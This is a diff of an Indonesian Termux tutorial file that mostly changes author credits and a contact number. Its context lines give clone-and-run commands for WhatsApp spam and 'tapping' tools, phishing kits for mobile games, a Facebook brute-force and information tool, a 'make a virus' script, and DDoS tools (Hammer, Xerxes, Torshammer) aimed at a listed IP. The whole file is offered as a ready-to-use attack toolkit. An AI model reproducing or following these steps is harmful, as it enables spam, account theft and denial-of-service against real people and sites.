@@ -30,8 +30,8 @@ $ cd prank
 $ ls
 $ php wa.php
 Kemudian masukan Nomor WhatsApp yang kalian ingin spam contoh : 085710917169 kemudian enter pada pilihan y/n pilih y
-.. .welcome back to me catatan:)....  #@vms
-         " jngan lupa subcribe pak *VEMAS DARK* -_-...  (:"
+.. .welcome back to me catatan:)....  
+  ____________________
 "phising game"
 (mobile legends dan clash of clan)
 $apt update
@@ -44,7 +44,8 @@ $git clone https://github.com/Senitopeng/PhisingGame
 $ls
 $cd PhisingGame
 $python2 phising.py
-*Gunain dengan bijak cuk -_-*
+____________________
+
 Cara Install OSIF ( Open Source Information Facebook )
 $ pkg install python2
 $ git clone https://github.com/ciku370/OSIF
@@ -52,7 +53,8 @@ $ cd OSIF
 $ pip2 install -r requirements.txt
 Dan cara menjalankannya menggunakan perintah :
 python2 osif.py
-   by: *Vdk*
+   by: *MR-HAMBALI*
+_________
 *~CARA SADAP WA~*
 *_SeNaNg-SeNaNg H4CK1NG MR.STAH_*
 $pkg update && pkg upgrade
@@ -62,6 +64,7 @@ $git clone https://github.com/AndriGanz/whatshack
 $cd whatshack
 $ls
 $sh whatshack.sh
+__________________
 *~Jangan salah gunakan~*
 Tutorial termux
 Silahkan perdalami...
@@ -74,6 +77,7 @@ $ ls
 $ cd D-TECH
 $ chmod +x d-tect.py
 $ python2 d-tect.py
+____________________
 2. cara uninstall tool termux
 rm -rf toolsnya
 3. cara buat virus
@@ -83,13 +87,14 @@ ls
 chmod vbug.py
 chmod -v vbug.py
 python2 vbug.py
+_______________
 4. irssi
   /connet irc.freenode.net
 /nick w3wandroid
 /join #modol
-_________________________
+_______________
 DDOS via Termux
-————————————
+_______________
 1. Hammer
 $ pkg update (tekan enter)
 $ pkg upgrade (tekan enter)
@@ -99,6 +104,7 @@ $ git clone https://github.com/cyweb/hammer (tekan enter)
 $ cd hammer (tekan enter)
 $ python hammer.py (tekan enter)
 $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   104.27.146.125
+_________________________________________
 2. Xerxes
 $ apt install git
 $ apt install clang
@@ -109,6 +115,7 @@ $ ls
 $ clang xerxes.c -o xerxes
 $ ls
 $ ./xerxes (nama website) 80
+_________________________________________
 3. Torshammer
 $ pkg update
 $ pkg install git
@@ -118,6 +125,7 @@ $ git clone https://github.com/dotfighter/torshammer.git
 $ ls
 $ cd torshammer
 $ python2 torshammer.py
+_________________________________________
 4. liteDDOS
 $ apt update
 $ apt upgrade
@@ -317,8 +325,9 @@ Apt install git
 git clone http://github.com/hnov7/mbf
 cd mbf
 python2 mbf. py
-Mbf tanpa username dan password. Jdi tinggl make aja
-[8/10 19.49] Yovis Si Wibub: --------------------------TOTUR MBF-----------------------$ pkg update && pkg upgrade
+MR-HAMBALI tanpa username dan password. Jadi tinggl make aja
+[8/10 19.49] Yovis Si Wibub: --------------------------TOTUR MR-HAMBALI----------------
+$ pkg update && pkg upgrade
 $ pkg install python2
 $ pip2 install mechanize
 ‌$ git clone https://github.com/pirmansx/mbf
@@ -718,6 +727,6 @@ $ cd
 $ cd rus
 $ ls
 $ sh v2.sh
-Kontak wa 083879017166
-Note: user name:Rusmana
+Kontak wa 083128356342
+Note: user name:MR-HAMBALI
 Pasword:X-One
